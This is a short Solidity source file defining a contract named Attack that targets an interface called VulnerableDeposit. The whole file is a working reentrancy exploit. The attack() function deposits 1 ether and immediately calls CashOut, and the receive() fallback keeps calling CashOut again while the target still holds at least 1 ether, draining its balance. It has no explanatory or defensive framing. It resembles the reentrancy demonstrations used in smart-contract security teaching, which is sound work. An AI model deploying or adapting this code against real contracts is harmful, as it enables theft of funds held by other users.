// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface VulnerableDeposit {
    function Deposit() external payable;
    function CashOut(uint256 _am) external payable;
}

contract Attack {
    VulnerableDeposit public target;

    constructor(address _vulnerableDepositAddress) {
        target = VulnerableDeposit(_vulnerableDepositAddress);
    }

    // Fallback function to receive Ether and re-enter CashOut
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.CashOut(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        target.Deposit{value: 1 ether}();
        target.CashOut(1 ether);
    }
}
